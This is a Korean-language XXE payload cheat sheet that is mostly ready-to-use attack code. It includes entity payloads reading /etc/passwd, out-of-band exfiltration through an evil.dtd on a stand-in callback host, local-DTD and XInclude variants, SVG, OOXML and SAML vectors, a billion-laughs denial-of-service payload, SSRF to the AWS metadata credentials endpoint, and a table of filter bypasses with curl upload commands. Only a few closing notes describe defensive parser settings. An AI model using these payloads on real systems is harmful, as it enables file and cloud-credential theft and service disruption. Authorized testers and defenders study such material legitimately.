### 기본 페이로드

#### Classic XXE (직접 반영)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>
```

#### Blind XXE (외부 콜백)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "https://CALLBACK.oast.fun/xxe">
]>
<root>&xxe;</root>
```

#### Parameter entity OOB 추출
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://CALLBACK/evil.dtd">
  %xxe;
]>
<root>test</root>
```

evil.dtd (콜백 서버 호스팅):
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://CALLBACK/?data=%file;'>">
%eval;
%exfil;
```

#### Local DTD 우회 (네트워크 차단 환경)
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM \"file:///nonexistent/&#x25;file;\">">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

#### XInclude (DOCTYPE 금지 시)
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</root>
```

#### SVG 업로드 XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

#### OOXML XXE (XLSX/DOCX 내부)
```bash
unzip sample.xlsx -d tmp/
# tmp/xl/sharedStrings.xml에 DOCTYPE + ENTITY 삽입
zip -r evil.xlsx tmp/
curl -X POST "https://target/api/import" -F "file=@evil.xlsx"
```

#### SOAP XXE (WS-Security)
```xml
<?xml version="1.0"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>&xxe;</soap:Body>
</soap:Envelope>
```

#### SAML XXE (saml-scanner 결합)
```xml
<?xml version="1.0"?>
<!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response>...&xxe;...</samlp:Response>
```

#### Billion laughs (DoS 변형)
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ...
]>
<lolz>&lol9;</lolz>
```

#### SSRF (외부 fetch만)
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

---

### 우회 페이로드

| 방어 | 우회 |
|---|---|
| `disallow-doctype-decl=true` 만 적용 | XInclude (`<xi:include>`) — DOCTYPE 불필요 |
| 일반 엔티티만 차단 | Parameter entity (`<!ENTITY % x SYSTEM ...>`) |
| 외부 네트워크 차단 | Local DTD trick — 시스템에 존재하는 DTD 활용 OOB |
| `setValidating(true)` 활성 | 별도 `load-external-dtd=false` 필요 — 검증 자체가 외부 DTD fetch |
| XML 서명 검증만 | XSW (XML Signature Wrapping) — 서명 노드와 파싱 노드 분리 |
| `libxml_disable_entity_loader(true)` (PHP 8.0+) | **방어 무효** — deprecated/no-op |
| UTF-8 검증 | UTF-7/UTF-16 BOM — `iconv -f UTF-8 -t UTF-16` 후 전송 |
| Content-Type `application/xml` 차단 | `text/xml`, `application/xhtml+xml`, `application/soap+xml` |
| CDATA escape | Parameter entity 기반 CDATA 래핑 공격 |

```bash
# UTF-16 BOM 우회
printf '\xfe\xff' > bom.bin
cat bom.bin payload.xml | iconv -f UTF-8 -t UTF-16 > utf16.xml
curl -X POST "https://target/api/xml" -H "Content-Type: application/xml" --data-binary @utf16.xml
```

---

### 참고사항

- Classic XXE (직접 반영)는 파서가 응답에 엔티티 결과 포함할 때만 — JSON API는 대부분 blind
- Parameter entity OOB는 외부 DTD 호스팅 인프라 필요 (콜백 서버 + DTD 파일)
- Local DTD trick은 외부 네트워크 차단 환경에서 주요 blind 추출 경로 — OS/설치 환경별 DTD 경로 다름 (Yelp/SUSE/RedHat)
- XInclude는 DOCTYPE 차단 우회 — `setXIncludeAware(false)` 미적용 환경
- Java `DocumentBuilderFactory`의 6개 `setFeature` 모두 활성화 필수 (1개 누락도 위험)
- PHP 8.0+에서 `libxml_disable_entity_loader`는 no-op — 코드 있어도 방어 안 됨
- OOXML (XLSX/DOCX), SVG, SAML Response가 XML 파서 통과 — file-upload-scanner와 결합
- Billion laughs (XML bomb)는 XXE는 아니나 같은 파서 설정 — DoS 영향
- `.NET XmlReaderSettings.DtdProcessing = Prohibit` + `XmlResolver = null` 권장
- Go `encoding/xml`은 DTD 미지원 — 안전
- AWS metadata XXE는 SSRF + 데이터 노출 동시 — 가장 큰 영향
- `expect://` 스킴 (libxml2 일부)으로 명령 실행 가능 (드물지만 존재)
- `gopher://` 스킴은 일부 PHP libxml2에서 지원
- Local DTD 후보: `/usr/share/yelp/dtd/docbookx.dtd`, `/usr/share/xml/fontconfig/fonts.dtd`, `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`
- 응답에 entity 내용이 직접 포함 안 되어도 OOB 콜백 + 파일 내용 추출 가능
- Encrypted XML (XML Encryption)도 처리 시점에 XXE 가능 — 암호화 검증과 별도
